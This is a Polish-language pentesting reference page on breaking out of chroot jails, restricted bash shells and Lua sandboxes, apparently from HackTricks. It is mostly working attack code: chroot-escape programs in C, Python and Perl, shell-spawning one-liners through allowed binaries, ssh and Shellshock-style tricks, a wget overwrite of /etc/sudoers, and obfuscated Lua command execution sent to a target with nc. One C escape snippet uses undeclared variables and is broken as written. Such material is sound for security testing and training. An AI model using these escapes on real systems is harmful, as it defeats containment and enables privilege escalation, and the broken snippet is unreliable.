# Ucieczka z Jaili

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Sprawdź** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać dowolny plik binarny z właściwością „Shell”**

## Ucieczki z Chroot

Z [wikipedii](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie jest przeznaczony do ochrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. W większości systemów konteksty chroot nie są prawidłowo zagnieżdżane, a programy uruchomione w chroot **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zwykle oznacza to, że aby się wydostać, musisz być rootem wewnątrz chroot.

> [!TIP]
> **Narzędzie** [**chw00t**](https://github.com/earthquake/chw00t) zostało stworzone do wykorzystywania poniższych scenariuszy i wydostawania się z `chroot`.

### Root + CWD

> [!WARNING]
> Jeśli jesteś **rootem** wewnątrz chroot, **możesz się wydostać**, tworząc **kolejny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą współistnieć (w systemie Linux), więc jeśli utworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze, będąc **poza nim**, znajdziesz się teraz **poza nowym chrootem**, a tym samym w systemie plików.
>
> Dzieje się tak, ponieważ chroot zazwyczaj NIE przenosi bieżącego katalogu roboczego do wskazanego katalogu, więc możesz utworzyć chroot, pozostając poza nim.

Zwykle nie znajdziesz pliku binarnego `chroot` wewnątrz jaila chroot, ale **możesz skompilować, przesłać i wykonać** plik binarny:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Zapisany fd

> [!WARNING]
> Jest to podobne do poprzedniego przypadku, ale tutaj **atakujący zapisuje deskryptor pliku do bieżącego katalogu**, a następnie **tworzy chroot w nowym folderze**. Na koniec, ponieważ ma **dostęp** do tego **FD** **spoza** chroot, uzyskuje do niego dostęp i **ucieka**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD może zostać przekazany przez Unix Domain Sockets, więc:
>
> - Utwórz proces potomny (fork)
> - Utwórz UDS, aby proces nadrzędny i potomny mogły się komunikować
> - Uruchom chroot w procesie potomnym w innym folderze
> - W procesie nadrzędnym utwórz FD folderu znajdującego się poza nowym chroot procesu potomnego
> - Przekaż ten FD procesowi potomnemu za pomocą UDS
> - Proces potomny wykona chdir do tego FD i ponieważ znajduje się on poza jego chroot, proces ucieknie z jaila

### Root + Mount

> [!WARNING]
>
> - Zamontowanie urządzenia root (/) w folderze znajdującym się wewnątrz chroot
> - Wykonanie chroot do tego folderu
>
> Jest to możliwe w Linux

### Root + /proc

> [!WARNING]
>
> - Zamontuj procfs w folderze znajdującym się wewnątrz chroot (jeśli nie został jeszcze zamontowany)
> - Znajdź pid, który ma inną wartość root/cwd, na przykład: /proc/1/root
> - Wykonaj chroot do tego wpisu

### Root(?) + Fork

> [!WARNING]
>
> - Utwórz Fork (proces potomny), wykonaj chroot do innego, głębiej położonego folderu w systemie plików i wykonaj na nim CD
> - Z poziomu procesu nadrzędnego przenieś folder, w którym znajduje się proces potomny, do folderu znajdującego się wcześniej niż chroot procesu potomnego
> - Ten proces potomny znajdzie się poza chroot

### ptrace

> [!WARNING]
>
> - Jakiś czas temu użytkownicy mogli debugować własne procesy z poziomu własnego procesu... ale obecnie nie jest to już domyślnie możliwe
> - Jeśli jednak jest to możliwe, możesz użyć ptrace do procesu i wykonać w nim shellcode ([zobacz ten przykład](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeracja

Uzyskaj informacje o jailu:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modyfikowanie PATH

Sprawdź, czy możesz zmodyfikować zmienną środowiskową PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Używanie vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers i przeglądarki pomocy

Wiele ograniczonych środowisk nadal udostępnia **pagers** lub **przeglądarki pomocy**. Zwykle można je szybciej wykorzystać niż próbować odtworzyć `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Jeśli `git` jest dostępny, pamiętaj, że dane wyjściowe pomocy zwykle przechodzą przez pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Typowe one-linery GTFOBins

Gdy już wiesz, do których plików binarnych można uzyskać dostęp, najpierw przetestuj oczywiste shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Jeśli możesz jedynie **wstrzykiwać argumenty** do dozwolonego polecenia (zamiast uruchamiać je bez ograniczeń), sprawdź również **GTFOArgs**.

### Utwórz skrypt

Sprawdź, czy możesz utworzyć plik wykonywalny zawierający _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Uzyskaj bash przez SSH

Jeśli uzyskujesz dostęp za pośrednictwem ssh, często możesz poprosić serwer o wykonanie **innego programu** zamiast ograniczonej powłoki logowania:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Jeśli `ssh` jest jednym z niewielu lokalnie dozwolonych plików binarnych, pamiętaj, że może również zostać wykorzystany jako **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Zadeklaruj
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Możesz na przykład nadpisać plik sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ograniczone wrappery powłoki (`git-shell`, `rssh`, `lshell`)

W niektórych środowiskach nie trafisz do zwykłego `rbash`, lecz do **wrapperów**, takich jak `git-shell`, `rssh` lub `lshell`:

- `git-shell` akceptuje wyłącznie polecenia Git po stronie serwera oraz wszystko, co znajduje się w `~/git-shell-commands/`. Jeśli ten katalog istnieje, uruchom `help`, aby wyświetlić dozwolone niestandardowe akcje. Jeśli możesz tam **zapisywać**, każdy plik wykonywalny umieszczony w tym katalogu stanie się dostępny.
- `rssh` / `lshell` zwykle zezwalają wyłącznie na operacje `scp`, `sftp`, `rsync` lub operacje w stylu Git. W takich przypadkach najpierw skup się na **prymitywach zapisu plików**: prześlij `authorized_keys`, plik startowy powłoki lub skrypt pomocniczy do lokalizacji z możliwością zapisu, a następnie połącz się ponownie za pomocą `ssh -t ...`.
- Jeśli wrapper filtruje tylko wiersz poleceń, wylicz dostępne pliki binarne, a następnie przejdź do **GTFOBins / GTFOArgs**.

### Inne triki

Sprawdź również:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Interesująca może być również strona:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Triki dotyczące escaping z Python Jails znajdują się na następującej stronie:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Na tej stronie znajdziesz globalne funkcje, do których masz dostęp wewnątrz Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval z wykonywaniem poleceń:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Kilka sztuczek umożliwiających **wywoływanie funkcji biblioteki bez używania kropek**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Wylicz funkcje biblioteki:
```bash
for k,v in pairs(string) do print(k,v) end
```
Pamiętaj, że za każdym razem, gdy wykonujesz poprzedni one-liner w **innym środowisku lua, kolejność funkcji się zmienia**. Dlatego jeśli musisz wykonać konkretną funkcję, możesz przeprowadzić brute force, wczytując różne środowiska lua i wywołując pierwszą funkcję biblioteki:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Uzyskaj interaktywną powłokę lua**: Jeśli znajdujesz się w ograniczonej powłoce lua, możesz uzyskać nową powłokę lua (miejmy nadzieję, że nieograniczoną), wywołując:
```bash
debug.debug()
```
## Referencje

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdy: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
